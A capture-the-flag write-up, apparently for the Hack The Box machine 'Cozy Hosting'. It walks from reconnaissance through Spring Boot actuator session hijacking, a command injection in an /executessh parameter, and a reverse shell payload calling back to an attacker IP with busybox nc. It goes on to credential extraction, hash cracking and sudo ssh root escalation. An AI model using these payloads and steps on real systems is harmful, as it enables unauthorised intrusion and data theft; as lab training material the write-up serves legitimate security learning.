# Cozy Hosting - Easy

```sh
sudo vim /etc/hosts
# map IP to cozyhosting.htb

nmap -T4 -p- -A -Pn -v cozyhosting.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
    * 80/tcp - http - nginx 1.18.0

* the webpage on port 80 is a corporate webpage for a website hosting solution

* web scan:

    ```sh
    gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # simple dir scan
    # checked with other wordlists and extensions but did not help

    ffuf -c -u "http://cozyhosting.htb" -H "Host: FUZZ.cozyhosting.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 178 -s
    # subdomain scan
    # testing with other wordlists also did not help
    ```

* the website has a /login option - which leads to a login form

* ```gobuster``` shows an /admin endpoint as well, but it redirects to /login

* attempting default or weak creds like 'admin:admin' does not work - so we can try bruteforcing using ```hydra```:

    ```sh
    # intercept request in Burp Suite
    # or use Developer tools to get POST request format

    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f cozyhosting.htb http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password</p>"
    ```

* the bruteforce attempt does not seem to work, so we can check for injection attacks like SQLi

* intercept a login request using Burp Suite, save it to a file, and feed it to ```sqlmap```:

    ```sh
    sqlmap -r cozy.req --batch --dump
    # does not give anything
    ```

* ```gobuster``` also shows an endpoint '/error' - this leads to a 500 server error page - "Whitelabel Error Page" with the message "This application has no explicit mapping for /error, so you are seeing this as a fallback.", and also includes an error "There was an unexpected error (type=None, status=999)"

* Googling for this error message shows that it is displayed by Spring Boot webapps

* ```gobuster``` did not show any pages with the standard wordlists and extensions, so we can attempt to fuzz with specific wordlists

* in this case, as it is a Spring Boot webapp, we can try to use wordlists related to Spring Boot:

    ```sh
    # we can find wordlists by Googling or locally

    ls -la /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific
    # we have a Spring Boot wordlist

    gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -x txt,php,html -t 10
    ```

* this works and we get a lot of ```/actuator/*``` endpoints:

    * /actuator
    * /actuator/sessions
    * /actuator/beans
    * /actuator/health/{path}
    * /actuator/health
    * /actuator/env
    * /actuator/env/{toMatch}
    * /actuator/mappings

* checking the /actuator page, it lists the above endpoints, and shows that they are locally hosted on port 8080 (but we cannot connect to port 8080)

* Google shows that in Spring Boot framework, actuators expose operational data about the web app and it is used to monitor & manage the apps

* navigating to /actuator/sessions - which fetches user sessions - gives us the username 'kanderson', and the session IDs

* the /actuator/beans endpoint shows a lot of data - it is supposed to list all Spring 'beans' configured in the app - we can check for any sensitive info but nothing of interest is found

* /actuator/health shows info on operational health of webapp; in this case it just says 'UP'

* /actuator/env shows app environment info - no sensitive info found

* /actuator/mappings - lists all 'RequestMapping' paths in app, so all endpoints

* checking all listed endpoints in /actuator/mappings shows a new endpoint '/executessh' which supports POST method

* the supported parameters are not listed in this JSON document, so we need to check the endpoint further:

    ```sh
    curl 'http://cozyhosting.htb/executessh' -X POST
    # this says 400 Bad Request
    ```

* from the session IDs found in /actuator/sessions earlier, we can use either of the listed session IDs to replace our existing session ID

* navigate to Developer Tools > Storage > session ID - replace with session ID of 'kanderson'; now if we navigate to /login, we are redirected to /admin

* /admin page shows the dashboard for 'Cozy Cloud'; it also has a section for 'connection settings', which interacts with the /executessh endpoint

* there is also a note mentioning the SSH private key would be found in the host's '.ssh/authorised_keys' file

* now, we can intercept a valid request in Burp Suite for the 'connection settings' form

* the request shows it is a POST call to /executessh, and takes 2 parameters - 'host' and 'username'

* if we enter a random hostname, we get an error like 'ssh: Could not resolve hostname host: Temporary failure in name resolution'

* looking up this error message, we can see that it is an exact copy of the error seen when ```ssh``` tries to resolve a hostname and fails - so it is very likely that it is simply using ```ssh``` under the hood

* if we use a value like '127.0.0.1' for 'host', we get the error "host key verification failed"

* with this context, we can attempt for injection attacks like command injection

* we can perform fuzzing using command injection wordlists; we need to test for both parameters:

    ```sh
    # from Burp Suite, we can copy request as curl command and modify it

    curl -i 'http://cozyhosting.htb/executessh' -X POST --data-binary 'host=host&username=kanderson'
    # -i to show response headers
    ```

* while we can use ```ffuf``` to automate this by filtering certain statements in the location header using '-fr' (filter regex) flag, we can start by [manual attempts in command injection](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/CommandInjections/README.md)

* we can test with the following operators/characters in Burp Suite (URL-encoded):

    * '
    * "
    * ;
    * \n
    * &
    * |
    * &&
    * ||
    * ``
    * $()

* we can test in the formats 'host=hostFUZZ&username=user' and 'host=host&userFUZZ' (where FUZZ is the operator) to determine which parameter is vulnerable to command injections

* when the 'username' paramter is injected, we get errors referencing to ```/bin/bash``` (e.g. - unexpected EOF), which means it is the vulnerable parameter - so we can continue our tests on this parameter

* we can now test in the format 'host=host&username=user{FUZZ}{COMMAND}' - and see which payload is able to execute the command

* we can test with a command such as ```ping -c 4 10.10.14.34``` and listen on our 'tun0' interface for ICMP packets, so that we can check for blind execution as well

* when we send out a URL-encoded request containing spaces, we get an error in the location header saying username cannot contain whitespaces; this means the space character may be blacklisted, and we need to refer alternative characters like tabs (%09) or ```${IFS}``` for the same function

* the following payload formats work:

    * host=host&username=user$(ping${IFS}-c${IFS}4${IFS}10.10.14.34)
    * host=host&username=user\`ping${IFS}-c${IFS}4${IFS}10.10.14.34\`

* we can use either of these formats to get RCE now after setting up a listener

* in this case, I used the payload ```host=host&username=user$(busybox${IFS}nc${IFS}10.10.14.34${IFS}4444${IFS}-e${IFS}bash)``` and got reverse shell:

    ```sh
    whoami
    # app

    # stabilise reverse shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # /app

    ls -la /home
    # we have a user 'josh', no read access

    ls -la
    # we have a file 'cloudhosting-0.0.1.jar'
    ```

* this '.jar' file is associated with the webapp; we can check this further for any secrets

* transfer the file to attacker:

    ```sh
    # on target
    md5sum cloudhosting-0.0.1.jar
    # check hash

    nc -l -p 5555 -q 0 < cloudhosting-0.0.1.jar
    ```

    ```sh
    # on attacker
    nc cozyhosting.htb 5555 > cloudhosting-0.0.1.jar

    md5sum cloudhosting-0.0.1.jar
    # verify hash
    ```

* we can open the JAR file as a project using ```jd-gui``` tool:

    ```sh
    sudo apt install jd-gui

    jd-gui
    # opens the interface
    ```

* open the JAR file and enumerate the project structure for any secrets:

    * the class file at '/BOOT-INF/classes/htb.cloudhosting/scheduled/FakeUser.class' uses the cleartext password 'MRdEQuv6~6P9' for username 'kanderson'
    * the file at '/BOOT-INF/classes/templates/application.properties' includes the DB username 'postgres' and password 'Vg&nvzAQ7XxR'; the file also shows that port 5432 is being used to connect to the DB locally

* we can attempt to login as 'josh' via SSH using the above 2 passwords, but that does not work

* as we have the PostgreSQL DB password, we can attempt to connect to the DB:

    ```sh
    # in reverse shell
    psql -h 127.0.0.1 -p 5432 -U postgres
    # connect to DB using password found earlier

    \l
    # list DBs

    \c cozyhosting
    # connect to 'cozyhosting' DB

    \dt
    # list table schema

    select * from users;
    # this gives us hashes

    \q
    # quit
    ```

* from the 'users' table, we get hashes for two users - 'kanderson' and 'admin' - we can crack the hash for the latter

* the hashes are in bcrypt format, so we can use mode 3200 in ```hashcat```:

    ```sh
    vim adminhash
    # paste admin hash

    hashcat -m 3200 adminhash /usr/share/wordlists/rockyou.txt --force
    # cracks the hash
    ```

* ```hashcat``` gives the cleartext password 'manchesterunited' - we can use this to log into SSH as 'josh':

    ```sh
    ssh josh@cozyhosting.htb

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows we can run this command - ```(root) /usr/bin/ssh *```

* [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo) shows the exploit for this:

    ```sh
    sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
    # this gives root shell

    cat /root/root.txt
    # root flag
    ```
